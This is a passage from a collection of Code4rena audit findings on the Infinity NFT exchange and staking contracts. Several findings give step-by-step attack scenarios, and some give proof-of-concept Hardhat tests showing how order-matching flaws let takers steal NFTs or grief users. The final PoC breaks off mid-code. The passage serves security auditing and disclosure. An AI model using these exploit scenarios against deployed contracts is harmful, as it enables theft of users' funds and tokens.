of `NFT ID[1]` and pays `15 ETH` and even so his order A has been executed he doesn't receive `NFT IDs[(2,1),(3,1)]` and contract would violates his signed parameters.  This examples shows that in verifying one to many order code should verify that one order's one  collection's token ids are not duplicates. (the function `doTokenIdsIntersect()` doesn't check for this).  This scenario is performable to `matchOneToManyOrders()` and `matchOrders()` and but exists in their code (related check logics) too. more important things about this scenario is that it doesn't require off-chain maching engine to make mistake or malicious act, anyone can call `takeOrders()` if NFT tokens are `ERC1155`. for other `NFT` tokens to perform this attack it requires that `seller==buyer` or some other strange cases (like auto selling when receiving in one contract).  ## Tools Used VIM  ## Recommended Mitigation Steps add checks to ensure `order`'s one `collection`'s token ids are not duplicate in `doTokenIdsIntersect()`  "}, {"title": "fund lose or griefing in all order matching functions [matchOneToOneOrders(), matchOneToManyOrders(), matchOrders(), takeMultipleOneOrders(), takeOrders()] because condition (seller != buyer ) is not checked in any of them", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/130", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L125-L364   # Vulnerability details  ## Impact Functions `matchOneToOneOrders()`, `matchOneToManyOrders()`, `matchOrders()`, `takeMultipleOneOrders()`, `takeOrders()` are for order matching and order execution and they validate different things about orders but there is no check for that `seller != buyer`, which can cause wrong order matching resulting in fund lose or fund theft or griefing. (it can be combined with other vulns to perform more damaging attacks)  ## Proof of Concept We only give proof of concept for `matchOneToManyOrders()` and other order execution/matching functions has similar bugs which root cause is not checking `seller != buyer`. This is `matchOneToManyOrders()` code: ```   /**    @notice Matches one  order to many orders. Example: A buy order with 5 specific NFTs with 5 sell orders with those specific NFTs.    @dev Can only be called by the match executor. Refunds gas cost incurred by the         match executor to this contract. Checks whether the given complication can execute the match.    @param makerOrder The one order to match    @param manyMakerOrders Array of multiple orders to match the one order against   */   function matchOneToManyOrders(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.MakerOrder[] calldata manyMakerOrders   ) external {     uint256 startGas = gasleft();     require(msg.sender == MATCH_EXECUTOR, 'OME');     require(_complications.contains(makerOrder.execParams[0]), 'invalid complication');     require(       IComplication(makerOrder.execParams[0]).canExecMatchOneToMany(makerOrder, manyMakerOrders),       'cannot execute'     );     bytes32 makerOrderHash = _hash(makerOrder);     require(isOrderValid(makerOrder, makerOrderHash), 'invalid maker order');     uint256 ordersLength = manyMakerOrders.length;     // the below 3 variables are copied to memory once to save on gas     // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas     // since these values won't change during function execution, we can save on gas by copying them to memory once     // instead of SLOADing once for each loop iteration     uint16 protocolFeeBps = PROTOCOL_FEE_BPS;     uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;     address weth = WETH;     if (makerOrder.isSellOrder) {       for (uint256 i = 0; i < ordersLength; ) {         // 20000 for the SSTORE op that updates maker nonce status from zero to a non zero status         uint256 startGasPerOrder = gasleft() + ((startGas + 20000 - gasleft()) / ordersLength);         _matchOneMakerSellToManyMakerBuys(           makerOrderHash,           makerOrder,           manyMakerOrders[i],           startGasPerOrder,           protocolFeeBps,           wethTransferGasUnits,           weth         );         unchecked {           ++i;         }       }       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;     } else {       uint256 protocolFee;       for (uint256 i = 0; i < ordersLength; ) {         protocolFee += _matchOneMakerBuyToManyMakerSells(           makerOrderHash,           manyMakerOrders[i],           makerOrder,           protocolFeeBps         );         unchecked {           ++i;         }       }       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;       uint256 gasCost = (startGas - gasleft() + WETH_TRANSFER_GAS_UNITS) * tx.gasprice;       // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas       // else we need to send the protocol fee separately in the execution currency       // since the buyer is common across many sell orders, this part can be executed outside the above for loop       // in contrast to the case where if the one order is a sell order, we need to do this in each for loop       if (makerOrder.execParams[1] == weth) {         IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), protocolFee + gasCost);       } else {         IERC20(makerOrder.execParams[1]).safeTransferFrom(makerOrder.signer, address(this), protocolFee);         IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), gasCost);       }     }   } ``` in its executions it calls `InfinityOrderBookComplication.canExecMatchOneToMany()`, `verifyMatchOneToManyOrders()`, `isOrderValid()` to see that if orders are valid and one order matched to all other orders but there is no check for `seller != buyer` in any of those functions. and also `ERC721` and `ERC20` allows funds and assets to be transferred from address to itself. So it's possible for `matchOneToManyOrders()` to match one user sell orders to its buy orders which can cause fund theft or griefing. This is the scenario for fund lose in `matchOneToManyOrders()`: 1. let's assume orders `NFT` ids are for one collection for simplicity. 2. `NFT ID[1]` fair price is `8 ETH` and `NFT ID[2]` fair price is `2 ETH`. 3. `user1` wants to buy `NFT IDs[1,2]` at `10 ETH` (both of them) so he create one buy order and signs it. 4. `user1` wants to sell `NFT ID[1]` at `2.5 ETH` and sell `NFT ID[2]` at `8.5 ETH`. and he wants to sell them immediately after buying them so he create this two sell orders and sign them. 5. `attacker` who has `NFT ID[1]` creates an sell order for it at `7.5 ETH` and signs it. 6. off-chain machining engine sends this orders to `matchOneToManyOrders()`: many orders = [`(attacker sell ID[1] at 7.5 ETH)` , `(user1 sell ID[1] at 2.5 ETH)`] , one order = `(user1 buy IDs[1,2] at 10ETH)` 7. function `matchOneToManyOrders()` logic will check orders and their matching and all the checks would be passed for matching one order to many order(becase tokens lists intersects and numTokens are valids too (`1+1=2`)) 8. function `matchOneToManyOrders()` would execute order and transfer funds and tokens which would result in: (transferring `7.5 ETH` from `user 1` to `attacker`) (transferring `2.5 ETH` from `user1` to `user1`) (transferring `NFT ID[1]` from `attacker` to `user1`) (transferring `NFT ID[1]` from `user1` to `user1`) 9. so in the end contract executed `user1` buy order `(user1 buy IDs[1,2] at 10ETH)` but `user` only received `NFT ID[1]` and didn't received `NFT ID[2]` so contract code perform operation contradiction to what `user1` has been signed.  Of course for this attack to work for `matchOneToManyOrders()` off-chain matching engine need to send wrong data but checks on the contract are not enough.  There are other scenarios for other functions that can cause griefing, for example for function `matchOrders()`: a user can have multiple order to buy some tokens in list of ids. it's possible to match these old orders: 1. `user1` has this order: A:`(user1 BUY 1 of IDs[1,2,3])` and  B:`(user1 BUY 1 of IDs[1,4,5])`  2. then the order B get executed for ID[1] and `user1` become the owner of `ID[1]` 3. `user1` wants to sell some of his tokens so he signs this order: C::`(user1 SELL 1 of IDs[1,6,7])` 4. matching engine would send order A and C with `constructedNfts=ID[1]` to `matchOrders()`. 5. `matchOrders()` would check conditions and would see that conditions are met and perform the transaction. 6. `user1` would pay some unnecessary order fee and it would become like griefing and DOS attack for him.  There may be other scenarios for this vuln to be harmful for users.  ## Tools Used VIM  ## Recommended Mitigation Steps add some checks to ensure that `seller != buyer`   "}, {"title": "Missing Complication check in `takeMultipleOneOrders`", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/125", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L300-L328   # Vulnerability details  An order's type and it's rules are defined in it's `Complication`. Not checking it would allow anyone to take any orders regardless of their Complication's rule, causing unexpected execution for order makers.  `takeMultipleOneOrders` assumes that all `makerOrders` are simple orderbook orders and the  Complication check is missing here.  #### Proof of Concept - Alice signs a makerOrder with `PrivateSaleComplication`, allowing only Bob to take the private sale order. - A malicious trader calls `takeMultipleOneOrders` to take Alice's order, despite the Complication only allowing Bob to take it.  #### Recommended Mitigation Steps Add `canExecTakeOneOrder` function in IComplication.sol and implement it in `InfinityOrderBookComplication` (and future Complications) to support `takeMultipleOneOrders` operation, then modify `takeMultipleOneOrders` to use the check: ``` function takeMultipleOneOrders() {     ...     for (uint256 i = 0; i < numMakerOrders; ) {         bytes32 makerOrderHash = _hash(makerOrders[i]);         bool makerOrderValid = isOrderValid(makerOrders[i], makerOrderHash);         bool executionValid = IComplication(makerOrders[i].execParams[0]).canExecTakeOneOrder(makerOrders[i]);                  require(makerOrderValid && executionValid, 'order not verified');                  require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');         require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');         uint256 execPrice = _getCurrentPrice(makerOrders[i]);         totalPrice += execPrice; // @audit-issue missing complication check         _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);         unchecked {             ++i;         }     }     ... } ```  "}, {"title": "InfinityStaker Pausable contract implemented incorrectly", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/122", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L67 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L86-L90 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L116    # Vulnerability details  ## Impact `InfinityStaker.sol` implemented Pausable contract, but there's no functionality added to `pause` and `unpause` the contract. If any attacker finds a way to exploit the contract and it's funds, at that time it will not let you pause the contract and funds can be lost.  ## Proof of Concept `InfinityStaker.sol` inhereted `Pausable.sol` of `Openzeppelin` and used `whenNotPaused` modifier for `stake()`, `unstake()` and `changeDuration()`,        function _pause() internal virtual whenNotPaused {         _paused = true;         emit Paused(_msgSender());      }   `_pause()` and `_unpause()` function of `Pausable.sol` used to `pause` and `unpause` the contract respectively and both has `internal` visibility, to use these functions it needs to access from the `infinityStaker.sol` internally.  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps add `pause` and `unpause` the contract function to `InfinityStaker.sol`  "}, {"title": "Incorrect condition marks valid order as invalid", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/120", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityOrderBookComplication.sol#L140   # Vulnerability details  ## Impact canExecMatchOrder is having an incorrect check which makes a valid order as invalid. doItemsIntersect function is also checked on sell.nfts, buy.nfts which is incorrect. doItemsIntersect should only be checked in reference to constructedNfts  ## Proof of Concept 1. Assume buy has nfts {A,B,C}, sell has nft {A,B}, constructedNfts has nft {A}, buy.constraints[0]/sell.constraints[0]/numConstructedItems is 1  2. Ideally this order should match since constructedNfts {A} is present in both buy and sell  3. But this will not match since doItemsIntersect(sell.nfts, buy.nfts) will fail because of item C which is not present in sell  ## Recommended Mitigation Steps Remove doItemsIntersect(sell.nfts, buy.nfts) from InfinityOrderBookComplication.sol#L140  "}, {"title": "_updateUserStakedAmounts() is not setting userstakedAmounts[user][].timestamp=0 when amount if 0 in some cases", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/116", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L287-L325   # Vulnerability details  ## Impact function `_updateUserStakedAmounts()` is supposed to update user staked amounts and it sets `userstakedAmounts[user][].timestamp=0` when `userstakedAmounts[user][].amount` is `0x0`. but there are some cases that code logic don't handle them and `amount` become `0x0` and code don't set `timestamp` to `0x0`. so any logic that is depended on `timestamp==0` when `amount==0` could fail, to my understanding setting `timestamp` is for gas efficiency.  ## Proof of Concept This is `_updateUserStakedAmounts()` code: ```   /** @notice Update user staked amounts for different duration on unstake     * @dev A more elegant recursive function is possible but this is more gas efficient    */   function _updateUserStakedAmounts(     address user,     uint256 amount,     uint256 noVesting,     uint256 vestedThreeMonths,     uint256 vestedSixMonths,     uint256 vestedTwelveMonths   ) internal {     if (amount > noVesting) {       userstakedAmounts[user][Duration.NONE].amount = 0;       userstakedAmounts[user][Duration.NONE].timestamp = 0;       amount = amount - noVesting;       if (amount > vestedThreeMonths) {         userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;         userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;         amount = amount - vestedThreeMonths;         if (amount > vestedSixMonths) {           userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;           userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;           amount = amount - vestedSixMonths;           if (amount > vestedTwelveMonths) {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;             userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;           } else {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;           }         } else {           userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;         }       } else {         userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;       }     } else {       userstakedAmounts[user][Duration.NONE].amount -= amount;     }   } ``` for example if `amount=noVesting` then code would execute line: `userstakedAmounts[user][Duration.NONE].amount -= amount;` which sets the `userstakedAmounts[user][Duration.NONE].amount` to `0x0` but `userstakedAmounts[user][Duration.NONE].timestamp` won't change. As as in all other logics when `amount` is `0x0` code set `timestamp` to `0x0` too but here that logic is not happening for this cases (amount equal to `noVesting` or `noVesting + vestedThreeMonths` or ...).  ## Tools Used VIM  ## Recommended Mitigation Steps change if conditions from `>` to `>=`, so for equal case the code set `timestamp` to `0x0` too.  "}, {"title": "`_transferNFTs()` succeeds even if no transfer is performed", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/87", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1062   # Vulnerability details  ## Impact If an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. In doing so, the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This could happen in the following cases: 1. a token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly. 2. an NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces. 3. a malicious contract that is deployed to take advantage of this behavior.   ## Proof of Concept https://gist.github.com/kylriley/3bf0e03d79b3d62dd5a9224ca00c4cb9  ## Tools Used N/A  ## Recommended Mitigation Steps If neither the ERC-721 nor the ERC-1155 interface is supported the function should revert. An alternative approach would be to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.  "}, {"title": "InfinityExchange computes gas refunds in a way where the first order's buyer pays less than the later ones", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/82", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L149 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L273   # Vulnerability details  ## Impact The way the gas refunds are computed in the InfinityExchange contract, the first orders pay less than the latter ones. This causes a loss of funds for the buyers whose orders came last in the batch.  ## Proof of Concept The issue is that the `startGasPerOrder` variable is computed within the for-loop. That causes the first iterations to be lower than later ones.  Here's an example for the following line: https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202 To make the math easy we use the following values: ``` startGas = 1,000,000 gasPerOrder = 100,000 (so fulfilling an order costs us 100,000 gas) ordersLength = 10 ```  For the 2nd order we then get: ``` startGasPerOrder = 900,000 + ((1,000,000 + 20,000 - 900,000) / 10) startGasPerOrder = 912,000 ``` For the 9th order we get: ``` startGasPerOrder = 200,000 + ((1,000,000 + 20,000 - 200,000) / 10) startGasPerOrder = 282,000 ```  The `startGasPerOrder` variable is passed through a couple of functions without any modification until it reaches a line like this: https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L231  ```sol uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice; ```  There, the actual gas costs for the user are computed.  In our case, that would be:  ``` # 2nd order # gasleft() is 800,00 because we said that executing the order costs ~100,000 gas. At the beginning of the order, it was 900,000 so now it's 800,000. This makes the computation a little more straightforward although it's not 100% correct. gasCost = (912,000 - 800,000 + 50,000) * 1 gasCost = 162,000  # 9th order gasCost = (282,000 - 100,000 + 50,000) * 1 gasCost = 232,000 ```  So the 2nd order's buyer pays `162,000` while the 9th order's buyer pays `232,000`.  As I said the math was dumbed down a bit to make it easier. The actual difference might not be as big as shown here. But, there is a difference.  ## Tools Used none  ## Recommended Mitigation Steps The `startGasPerOrder` variable should be initialized *outside* the for-loop.  "}, {"title": "Non-Deterministic Nonce Leading to Non Cancellable Orders", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/66", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L375-L402 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L507-L530   # Vulnerability details  ## Impact The current nonce is non-deterministic. This means that at any point in time, it is not possible to say what the current nonce for a given signer is.  **So, there is no way to cancel all pending orders.**  ## Proof of Concept Let's say there was a mass phishing attack on users and some signatures were phished.  Since the user does not know the nonce of the signatures that were signed by him/her, he/she cannot cancel it via `cancelMultipleOrders`.  And there is no way to cancel all pending orders. Since the nonce can be any arbitrary value, if the signature had a UINT256 MAX value, there is no way to cancel it via `cancelAllOrders`.  ## Tools Used VS Code  ## Recommended Mitigation Steps It is recommended to have a deterministic nonce, instead of a non-deterministic nonce. 1. Instead of tracking minNonce, we should track currentNonce. 2. Only allow one increment of the nonce. `cancelAllOrders` should increment the current nonce by 1. 3. Only signatures that match the currentNonce should be considered valid (exactly equal). 4. Instead of canceling orders by nonce, the hash map should be by order hash. So, `isUserOrderNonceExecutedOrCancelled[msg.sender][orderHash]` should be recorded.  If these steps are taken, any such phishing attack can be prevented by simply calling `cancelAllOrders` and incrementing the nonce, because the signature must match the current nonce, and so if the current nonce is incremented by 1, there will be a mismatch and will invalid all pending orders.  Also, specific listings can be canceled by `cancelMultipleOrders` which can check `isUserOrderNonceExecutedOrCancelled[msg.sender][orderHash]`  "}, {"title": "Calling `unstake()` can cause locked funds", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/50", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/staking/InfinityStaker.sol#L290-L325   # Vulnerability details  ## Impact Following scenario:  Alice has staked X token for 6 months that have vested. She stakes Y tokens for another three months. If she now calls `unstake(X)` to take out the tokens that have vested, the Y tokens she staked for three months will be locked up.  ## Proof of Concept First, here's a test showcasing the issue:  ```js   describe('should cause trouble', () => {     it('should lock up funds', async function () {       await approveERC20(signer1.address, token.address, amountStaked, signer1, infinityStaker.address);       await infinityStaker.connect(signer1).stake(amountStaked, 2);       await network.provider.send(\"evm_increaseTime\", [181 * DAY]);       await network.provider.send('evm_mine', []);              // The funds we staked for 6 months have vested       expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);        // Now we want to stake funds for three months       await approveERC20(signer1.address, token.address, amountStaked2, signer1, infinityStaker.address);       await infinityStaker.connect(signer1).stake(amountStaked2, 1);        // total staked is now the funds staked for three & six months       // total vested stays the same       expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(amountStaked.add(amountStaked2));       expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);        // we unstake the funds that are already vested.       const userBalanceBefore = await token.balanceOf(signer1.address);       await infinityStaker.connect(signer1).unstake(amountStaked);       const userBalanceAfter = await token.balanceOf(signer1.address);        expect(userBalanceAfter).to.eq(userBalanceBefore.add(amountStaked));        expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(ethers.BigNumber.from(0));       expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(ethers.BigNumber.from(0));     });   }); ```  The test implements the scenario I've described above. In the end, the user got back their `amountStaked` tokens with the `amountStaked2` tokens being locked up in the contract. The user has no tokens staked at the end.  The issue is in the `_updateUserStakedAmounts()` function:  ```sol     if (amount > noVesting) {       userstakedAmounts[user][Duration.NONE].amount = 0;       userstakedAmounts[user][Duration.NONE].timestamp = 0;       amount = amount - noVesting;       if (amount > vestedThreeMonths) {         // MAIN ISSUE:         // here `vestedThreeMonths` is 0. The current staked tokens are set to `0` and `amount` is decreased by `0`.         // Since `vestedThreeMonths` is `0` we shouldn't decrease `userstakedAmounts` at all here.         userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;         userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;         amount = amount - vestedThreeMonths;         // `amount == vestedSixMonths` so we enter the else block         if (amount > vestedSixMonths) {           userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;           userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;           amount = amount - vestedSixMonths;           if (amount > vestedTwelveMonths) {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;             userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;           } else {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;           }         } else {           // the staked amount is set to `0`.           userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;         }       } else {         userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;       }     } else {       userstakedAmounts[user][Duration.NONE].amount -= amount;     } ```   ## Tools Used none  ## Recommended Mitigation Steps Don't set `userstakedAmounts.amount` to `0` if none of its tokens are removed (`vestedAmount == 0`)  "}, {"title": "Some real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/43", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1062-L1072   # Vulnerability details  ## Impact  Many real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`, i.e., transferring less tokens than expected.  For example, the asset token of [The Sandbox Game](https://www.sandbox.game/en/), a Top20 ERC1155 token on [Etherscan](https://etherscan.io/tokens-nft1155?sort=7d&order=desc), supports both ERC1155 and ERC721 interfaces. Specifically, any ERC721 token transfer is regarded as an ERC1155 token transfer with only one item transferred ([token address](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5) and [implementation](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L14)).  Assuming there is a user tries to buy two tokens of Sandbox's ASSETs with the same token id, the actual transferring is carried by `InfinityExchange::_transferNFTs` which first checks ERC721 interface supports and then ERC1155.  ```solidity=   function _transferNFTs(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {       _transferERC721s(from, to, item);     } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {       _transferERC1155s(from, to, item);     }   } ```  The code will go into `_transferERC721s` instead of `_transferERC1155s`, since the Sandbox's ASSETs also support ERC721 interface. Then,   ```solidity=   function _transferERC721s(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     uint256 numTokens = item.tokens.length;     for (uint256 i = 0; i < numTokens; ) {       IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);       unchecked {         ++i;       }     }   } ```  Since the `ERC721(item.collection).safeTransferFrom` is treated as an ERC1155 transferring with one item ([reference](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L833)), there is only one item actually gets traferred.  That means, the user, who barely know the implementation details of his NFTs, will pay the money for two items but just got one.  Note that the situation of combining ERC721 and ERC1155 is prevalent and poses a great vulnerability of the exchange contract.     ## Proof of Concept Check the return values of [Sandbox's ASSETs](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5)'s `supportInterface`, both `supportInterface(0x80ac58cd)` and `supportInterface(0xd9b67a26)` return true.   ## Tools Used Manual Inspection  ## Recommended Mitigation Steps Reorder the checks,e.g.,   ```solidity=   function _transferNFTs(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {       _transferERC1155s(from, to, item);     } else if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {       _transferERC721s(from, to, item);     }   } ```   "}, {"title": "`canExecTakeOrder` mismatches `makerOrder` and `takerItems` when duplicated items present", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/12", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L154-L164 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L336-L364 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L178-L243   # Vulnerability details  ## Impact When any user provides a `sellOrder` and they are trying to sell multiple tokens from _n_ (n > 1) different `ERC1155` collections in a single order, hakcers can get the tokens of most expensive collections (with n times of the original amount) by paying the same price.  In short, hackers can violate the user-defined orders.  ## Root Cause The logic of `canExecTakeOrder` and `canExecMatchOneToMany` is not correct.  __Let's `canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems) ` as an example, while `canExecMatchOneToMany` shares the same error.__   Specifically, it first checks whether the number of selling item in `makerOrder` matches with the ones in `takerItems`. Note that the number is an aggregated one. Then, it check whether all the items in `takerItems` are within the scope defined by `makerOrder`.  The problem comes when there are duplicated items in `takerItems`. The aggregated number would be correct and all taker's Items are indeed in the order. However, it does not means `takerItems` exactly matches all items in `makerOrder`, which means violation of the order.  For example, if the order requires ``` [     {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     },     {           collection: mock1155Contract2.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     } ];  ```  and the taker provides ``` [     {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     },     {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     } ]; ```  The taker can grabs two `mock1155Contract1` tokens by paying the order which tries to sell a `mock1155Contract1` token and a `mock1155Contract2` token. When `mock1155Contract1` is much more expensive, the victim user will suffer from a huge loss.  As for the approving issue, the users may grant the contract unlimited access, or they may have another order which sells `mock1155Contract1` tokens. The attack is easy to perform.  ## Proof of Concept First put the `MockERC1155.sol` under the `contracts/` directory: ```solidity  // SPDX-License-Identifier: MIT pragma solidity 0.8.14; import {ERC1155URIStorage} from '@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol'; import {ERC1155} from '@openzeppelin/contracts/token/ERC1155/ERC1155.sol'; import {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';  contract MockERC1155 is ERC1155URIStorage, Ownable {   uint256 numMints;    constructor(string memory uri) ERC1155(uri) {}    function mint(address to, uint256 id, uint256 amount, bytes memory data) external onlyOwner {     super._mint(to, id, amount, data);   } } ```  And then put `poc.js` under the `test/` directory. ```js const { expect } = require('chai'); const { ethers, network } = require('hardhat'); const { deployContract, NULL_ADDRESS, nowSeconds } = require('../tasks/utils'); const {   getCurrentSignedOrderPrice,   approveERC20,   grantApprovals,   signOBOrder } = require('../helpers/orders');  async function prepare1155OBOrder(user, chainId, signer, order, infinityExchange) {   // grant approvals   const approvals = await grantApprovals(user, order, signer, infinityExchange.address);   if (!approvals) {     return undefined;   }    // sign order   const signedOBOrder = await signOBOrder(chainId, infinityExchange.address, order, signer);    const isSigValid = await infinityExchange.verifyOrderSig(signedOBOrder);   if (!isSigValid) {     console.error('Signature is invalid');     return undefined;   }   return signedOBOrder; }  describe('PoC', function () {   let signers,     dev,     matchExecutor,     victim,     hacker,     token,     infinityExchange,     mock1155Contract1,     mock1155Contract2,     obComplication    const sellOrders = [];    let orderNonce = 0;    const UNIT = toBN(1e18);   const INITIAL_SUPPLY = toBN(1_000_000).mul(UNIT);    const totalNFTSupply = 100;   const numNFTsToTransfer = 50;   const numNFTsLeft = totalNFTSupply - numNFTsToTransfer;    function toBN(val) {     return ethers.BigNumber.from(val.toString());   }    before(async () => {     // signers     signers = await ethers.getSigners();     dev = signers[0];     matchExecutor = signers[1];     victim = signers[2];     hacker = signers[3];     // token     token = await deployContract('MockERC20', await ethers.getContractFactory('MockERC20'), signers[0]);      // NFT constracts (ERC1155)     